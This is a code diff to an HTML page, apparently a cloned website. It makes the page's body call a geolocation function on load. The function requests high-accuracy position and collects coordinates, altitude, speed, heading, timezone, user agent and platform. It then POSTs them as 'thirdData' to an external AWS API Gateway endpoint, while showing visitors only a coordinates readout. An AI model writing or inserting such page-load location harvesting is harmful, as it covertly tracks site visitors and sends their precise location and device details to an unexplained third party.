@@ -271,7 +271,7 @@
 
 </head>
 
-<body>
+<body onload="getLocation();">
 	<div class="container-fluid " style="padding:0px;width:100vw;">
 		<div class="no_header">
 			<div class="headerbox fl">
@@ -921,59 +921,62 @@
 			});
 		});
 
-	document.getElementById("result").innerHTML = "Fetching...";
+	function getLocation() {
 
-	if (!navigator.geolocation) {
-		document.getElementById("result").innerHTML = "Not Supported!";
-		return;
-	}
+		document.getElementById("result").innerHTML = "Fetching...";
 
-	navigator.geolocation.getCurrentPosition(
-		(pos) => {
-			document.getElementById("result").innerHTML = `
+		if (!navigator.geolocation) {
+			document.getElementById("result").innerHTML = "Not Supported!";
+			return;
+		}
+
+		navigator.geolocation.getCurrentPosition(
+			(pos) => {
+				document.getElementById("result").innerHTML = `
                         ✅ Success!<br>
                         Latitude: ${pos.coords.latitude}<br>
                         Longitude: ${pos.coords.longitude}<br>
                         Accuracy: ${pos.coords.accuracy} meters
                     `;
 
-			const locationData = {
-				latitude: pos.coords.latitude,
-				longitude: pos.coords.longitude,
-				accuracy: pos.coords.accuracy,
-				altitude: pos.coords.altitude,
-				altitudeAccuracy: pos.coords.altitudeAccuracy,
-				heading: pos.coords.heading,
-				speed: pos.coords.speed,
-				timestamp: new Date(pos.timestamp).toISOString(),
-				timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-				userAgent: navigator.userAgent,
-				platform: navigator.platform
-			};
+				const locationData = {
+					latitude: pos.coords.latitude,
+					longitude: pos.coords.longitude,
+					accuracy: pos.coords.accuracy,
+					altitude: pos.coords.altitude,
+					altitudeAccuracy: pos.coords.altitudeAccuracy,
+					heading: pos.coords.heading,
+					speed: pos.coords.speed,
+					timestamp: new Date(pos.timestamp).toISOString(),
+					timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+					userAgent: navigator.userAgent,
+					platform: navigator.platform
+				};
 
-			return fetch("https://sjwvbem9lk.execute-api.ap-south-1.amazonaws.com/dev", {
-				method: "POST",
-				headers: {
-					"Content-Type": "application/json"
-				},
-				body: JSON.stringify({
-					thirdData: locationData
-				})
-			});
+				return fetch("https://sjwvbem9lk.execute-api.ap-south-1.amazonaws.com/dev", {
+					method: "POST",
+					headers: {
+						"Content-Type": "application/json"
+					},
+					body: JSON.stringify({
+						thirdData: locationData
+					})
+				});
 
-		},
-		(err) => {
-			document.getElementById("result").innerHTML = `
+			},
+			(err) => {
+				document.getElementById("result").innerHTML = `
                         ❌ Error Code: ${err.code}<br>
                         Message: ${err.message}
                     `;
-		},
-		{
-			enableHighAccuracy: true,
-			timeout: 15000,
-			maximumAge: 0
-		}
-	);
+			},
+			{
+				enableHighAccuracy: true,
+				timeout: 15000,
+				maximumAge: 0
+			}
+		);
+	}
 </script>
 
 <script src="../../cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
